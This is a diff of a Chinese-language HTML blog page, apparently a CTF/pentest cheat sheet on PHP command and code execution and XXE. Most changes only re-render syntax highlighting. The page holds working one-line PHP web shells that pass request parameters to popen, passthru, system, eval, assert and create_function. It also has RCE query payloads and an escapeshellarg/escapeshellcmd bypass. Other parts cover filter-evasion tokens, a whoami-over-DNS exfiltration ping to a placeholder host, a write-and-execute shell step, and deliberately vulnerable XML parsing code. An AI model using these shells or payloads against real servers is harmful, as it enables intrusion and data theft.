-<h4 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open"></a>proc_open</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>=popen(<span class="variable">$cmd</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">while</span>(!feof(<span class="variable">$a</span>))&#123;</span><br><span class="line">	<span class="keyword">echo</span> fgets(<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open"></a>proc_open</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
 <h4 id="passthru"><a href="#passthru" class="headerlink" title="passthru"></a>passthru</h4><p>执行外部程序并显示原始输出</p>
 <p> passthru ( string <code>$command</code> [, int <code>&amp;$return_var</code> ] ) : void </p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cmd=$_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">echo</span> passthru($cmd);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> passthru(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
 
 <h3 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h3><p>escapeshellcmd escapeshellarg 单引号逃逸</p>
 <p>escapeshellcmd原本是 为了防止命令注入的，但是两个连用就会出问题</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&apos; -v -d a=1 ==&gt; &apos;127.0.0.1&apos;\&apos;&apos; -v -d a=1&apos; escapeshellarg先对单引号进行转义，然后在对左右两端分别加上单引号</span><br><span class="line">&apos;127.0.0.1&apos;\&apos;&apos; -v -d a=1&apos; ==&gt; &apos;127.0.0.1&apos;\\&apos;&apos; -v -d a=1\&apos; escapeshellcmd对\ &apos;进行转义，对\进行转义后，\\就起不到转义的作用了，&apos;&apos;就形成了一个空连接符，字符串末尾的&apos;成为了一个独立的单引号，</span><br><span class="line">所以escapashellcmd会对其进行转义</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&#39; -v -d a&#x3D;1 &#x3D;&#x3D;&gt; &#39;127.0.0.1&#39;\&#39;&#39; -v -d a&#x3D;1&#39; escapeshellarg先对单引号进行转义，然后在对左右两端分别加上单引号</span><br><span class="line">&#39;127.0.0.1&#39;\&#39;&#39; -v -d a&#x3D;1&#39; &#x3D;&#x3D;&gt; &#39;127.0.0.1&#39;\\&#39;&#39; -v -d a&#x3D;1\&#39; escapeshellcmd对\ &#39;进行转义，对\进行转义后，\\就起不到转义的作用了，&#39;&#39;就形成了一个空连接符，字符串末尾的&#39;成为了一个独立的单引号，</span><br><span class="line">所以escapashellcmd会对其进行转义</span><br></pre></td></tr></table></figure>
+
 
 <h4 id="OOB带外"><a href="#OOB带外" class="headerlink" title="OOB带外"></a>OOB带外</h4><p>linux</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping `whoami`.xxx.xxx.io  <span class="comment">#xxx为ceye的ip</span></span><br></pre></td></tr></table></figure>
-
 <p>windows</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping %USERNAME%.xxx.xxx.io</span><br></pre></td></tr></table></figure>
-
 <h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#写入文件</span></span><br><span class="line"><span class="built_in">echo</span> bHM=|base64 &gt; /tmp/shell.sh</span><br><span class="line"><span class="comment">#给权限</span></span><br><span class="line">chmod 777 /tmp/shell.sh</span><br><span class="line"><span class="comment">#执行</span></span><br><span class="line">/tmp/shell.sh</span><br></pre></td></tr></table></figure>
-
 <h4 id="关键字的绕过"><a href="#关键字的绕过" class="headerlink" title="关键字的绕过"></a>关键字的绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">空格 %0a $&#123;IFS&#125; %09 &lt; $IFS$9</span><br><span class="line"></span><br><span class="line">有时候会碰到分割两条命令的情况，可以用; %0a %0d | &amp; %00等</span><br><span class="line"></span><br><span class="line">还可以使用命令续行符\</span><br></pre></td></tr></table></figure>
-
 <p> <code>$9</code>只是当前系统shell进程的第九个参数的持有者，它始终为空字符串! </p>
-<h4 id="拼接绕过"><a href="#拼接绕过" class="headerlink" title="拼接绕过"></a>拼接绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">'sys'</span>;</span><br><span class="line">$b=<span class="string">'tem'</span>;</span><br><span class="line">$a.$b($_GET[<span class="string">'shell'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="拼接绕过"><a href="#拼接绕过" class="headerlink" title="拼接绕过"></a>拼接绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;sys&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;tem&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>.<span class="variable">$b</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
 
 <p>shell拼接</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=l;b=s;$a$b</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=l;b=s;$a<span class="variable">$b</span></span><br></pre></td></tr></table></figure>
 
-<h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>($_POST[<span class="string">'shell'</span>]);</span><br></pre></td></tr></table></figure>
 
-<h3 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert($_POST[<span class="string">'shell'</span>]);</span><br></pre></td></tr></table></figure>
-
+<h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+<h3 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br></pre></td></tr></table></figure>
 <h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h3><p>/e修饰符可以导致命令执行</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a=<span class="string">'123'</span>;</span><br><span class="line">preg_replace(<span class="string">'/[0-9]/e'</span>,$_GET[<span class="string">'shell'</span>],$a);</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">preg_replace(<span class="string">&#x27;/[0-9]/e&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>],<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
+<h3 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func"></a>call_user_func</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">func=assert&amp;cmd=phpinfo()</span><br></pre></td></tr></table></figure>
+<h3 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array"></a>call_user_func_array</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">call_user_func_array(<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">func=assert&amp;cmd[]=phpinfo()</span><br></pre></td></tr></table></figure>
+<h3 id="array-map"><a href="#array-map" class="headerlink" title="array_map"></a>array_map</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">array_map(<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">func=assert&amp;cmd[]=phpinfo()</span><br></pre></td></tr></table></figure>
 
-<h3 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func"></a>call_user_func</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">call_user_func($_GET[<span class="string">'func'</span>],$_GET[<span class="string">'cmd'</span>]);</span><br><span class="line"></span><br><span class="line">func=assert&amp;cmd=phpinfo()</span><br></pre></td></tr></table></figure>
 
-<h3 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array"></a>call_user_func_array</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">call_user_func_array($_GET[<span class="string">'func'</span>],$_GET[<span class="string">'cmd'</span>]);</span><br><span class="line"></span><br><span class="line">func=assert&amp;cmd[]=phpinfo()</span><br></pre></td></tr></table></figure>
+<h3 id="array-filter"><a href="#array-filter" class="headerlink" title="array_filter"></a>array_filter</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">array_filter($_GET[&#39;code&#39;],$_GET[&#39;func&#39;]);</span><br><span class="line"></span><br><span class="line">?func&#x3D;assert&amp;code[]&#x3D;phpinfo();</span><br></pre></td></tr></table></figure>
 
-<h3 id="array-map"><a href="#array-map" class="headerlink" title="array_map"></a>array_map</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">array_map($_GET[<span class="string">'func'</span>],$_GET[<span class="string">'cmd'</span>]);</span><br><span class="line"></span><br><span class="line">func=assert&amp;cmd[]=phpinfo()</span><br></pre></td></tr></table></figure>
 
-<h3 id="array-filter"><a href="#array-filter" class="headerlink" title="array_filter"></a>array_filter</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">array_filter($_GET[&apos;code&apos;],$_GET[&apos;func&apos;]);</span><br><span class="line"></span><br><span class="line">?func=assert&amp;code[]=phpinfo();</span><br></pre></td></tr></table></figure>
-
-<h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">create_function(<span class="string">'$a,$b'</span>,<span class="string">'return 111'</span>)</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">($a, $b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">111</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+<h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">create_function(<span class="string">&#x27;$a,$b&#x27;</span>,<span class="string">&#x27;return 111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">111</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>两种注入形式</p>
 <h4 id="no-1"><a href="#no-1" class="headerlink" title="no.1"></a>no.1</h4><p>函数体的注入</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create_function($arg,<span class="string">"echo"</span>.$arg);</span><br><span class="line">==&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">name</span><span class="params">($arg)</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> $arg;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">create_function(<span class="variable">$arg</span>,<span class="string">&quot;echo&quot;</span>.<span class="variable">$arg</span>);</span><br><span class="line">==&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"><span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$arg</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>代码注入</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$arg=$_GET[<span class="string">'arg'</span>];</span><br><span class="line">$code=<span class="string">"echo hello"</span>.$arg.<span class="string">";"</span>;</span><br><span class="line">$func=create_function(<span class="string">'$arg'</span>, $code);</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line">    functions name($arg)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello"</span>.$arg.<span class="string">";"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$arg</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;arg&#x27;</span>];</span><br><span class="line"><span class="variable">$code</span>=<span class="string">&quot;echo hello&quot;</span>.<span class="variable">$arg</span>.<span class="string">&quot;;&quot;</span>;</span><br><span class="line"><span class="variable">$func</span>=create_function(<span class="string">&#x27;$arg&#x27;</span>, <span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line">    functions name(<span class="variable">$arg</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello&quot;</span>.<span class="variable">$arg</span>.<span class="string">&quot;;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>注入点在函数体内，闭合实际上是闭合的函数体，</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
 
 <h4 id="no-2"><a href="#no-2" class="headerlink" title="no.2"></a>no.2</h4><p>函数参数的注入</p>
 <p>以一道ctf为例 这个题还需要另一个trick，php的命名空间加上\ 表示绝对路径，不加表示相对</p>
 <p>也就是说调用函数也可以\create_function 使用绝对路径的形式调用</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$act = @$_GET[<span class="string">'act'</span>];</span><br><span class="line">$arg = @$_GET[<span class="string">'arg'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>,$act)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'check'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $act($arg,<span class="string">''</span>);</span><br><span class="line">&#125; </span><br><span class="line">==&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">name</span><span class="params">($arg)</span></span>&#123; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$act</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;act&#x27;</span>];</span><br><span class="line"><span class="variable">$arg</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;arg&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$act</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;check&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$act</span>(<span class="variable">$arg</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&#125; </span><br><span class="line">==&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"><span class="variable">$arg</span></span>)</span>&#123; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>注入点在参数内，函数体为空，无法在函数体内注入，可以闭合圆括号，构造RCE </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?act=\create_function&amp;arg=)&#123;&#125;;system(&apos;ls&apos;);/*</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?act&#x3D;\create_function&amp;arg&#x3D;)&#123;&#125;;system(&#39;ls&#39;);&#x2F;*</span><br></pre></td></tr></table></figure>
 
-<h3 id="ob-start"><a href="#ob-start" class="headerlink" title="ob_start"></a>ob_start</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool ob_start ([ callback $output_callback [, int $chunk_size [, bool $erase ]]] )</span><br></pre></td></tr></table></figure>
+
+<h3 id="ob-start"><a href="#ob-start" class="headerlink" title="ob_start"></a>ob_start</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> ob_start ([ callback <span class="variable">$output_callback</span> [, <span class="keyword">int</span> <span class="variable">$chunk_size</span> [, <span class="keyword">bool</span> <span class="variable">$erase</span> ]]] )</span><br></pre></td></tr></table></figure>
 
 <p>此函数将打开输出缓冲。当输出缓冲激活后，脚本将不会输出内容（除http标头外），相反需要输出的内容被存储在内部缓冲区中。</p>
 <p>内部缓冲区的内容可以用 ob_get_contents() 函数复制到一个字符串变量中。 想要输出存储在内部缓冲区中的内容，可以使用 ob_end_flush() 函数。另外， 使用 ob_end_clean() 函数会静默丢弃掉缓冲区的内容。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ob_start(<span class="string">"system"</span>);</span><br><span class="line"><span class="keyword">echo</span> $_GET[<span class="string">'shell'</span>];</span><br><span class="line">ob_end_flush();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">?shell=whoami</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ob_start(<span class="string">&quot;system&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>];</span><br><span class="line">ob_end_flush();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">?shell=whoami</span><br></pre></td></tr></table></figure>
 
-<h3 id="usort-uasort"><a href="#usort-uasort" class="headerlink" title="usort/uasort"></a>usort/uasort</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ool usort ( <span class="keyword">array</span> &amp;$array , callable $value_compare_func )</span><br></pre></td></tr></table></figure>
 
+<h3 id="usort-uasort"><a href="#usort-uasort" class="headerlink" title="usort/uasort"></a>usort/uasort</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ool usort ( <span class="keyword">array</span> &amp;<span class="variable">$array</span> , <span class="keyword">callable</span> <span class="variable">$value_compare_func</span> )</span><br></pre></td></tr></table></figure>
 <p>本函数将用用户自定义的比较函数对一个数组中的值进行排序。 如果要排序的数组需要用一种不寻常的标准进行排序，那么应该使用此函数。</p>
 <p>shell_1</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">usort(...$_GET);</span><br><span class="line"></span><br><span class="line">?<span class="number">1</span>[]=test&amp;<span class="number">1</span>[]=phpinfo();&amp;<span class="number">2</span>=assert</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">usort(...<span class="variable">$_GET</span>);</span><br><span class="line"></span><br><span class="line">?<span class="number">1</span>[]=test&amp;<span class="number">1</span>[]=phpinfo();&amp;<span class="number">2</span>=assert</span><br></pre></td></tr></table></figure>
+
 
 <p>shell_2</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">usort($_GET, <span class="string">'asse'</span>.<span class="string">'rt'</span>);</span><br><span class="line"></span><br><span class="line">?<span class="number">1</span>=<span class="number">1</span>+<span class="number">1</span>&amp;<span class="number">2</span>=phpinfo();</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">usort(<span class="variable">$_GET</span>, <span class="string">&#x27;asse&#x27;</span>.<span class="string">&#x27;rt&#x27;</span>);</span><br><span class="line"></span><br><span class="line">?<span class="number">1</span>=<span class="number">1</span>+<span class="number">1</span>&amp;<span class="number">2</span>=phpinfo();</span><br></pre></td></tr></table></figure>
 
-<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><h3 id="DOMDocument"><a href="#DOMDocument" class="headerlink" title="DOMDocument"></a>DOMDocument</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line"></span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($data);</span><br><span class="line"></span><br><span class="line">print_r($dom);</span><br></pre></td></tr></table></figure>
 
-<h3 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a>SimpleXMLElement</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$xml = <span class="keyword">new</span> SimpleXMLElement($data);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $xml-&gt;name;</span><br></pre></td></tr></table></figure>
 
-<h3 id="simplexml-load-string"><a href="#simplexml-load-string" class="headerlink" title="simplexml_load_string"></a>simplexml_load_string</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$xml = simplexml_load_string($data);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $xml-&gt;name;</span><br></pre></td></tr></table></figure>
 
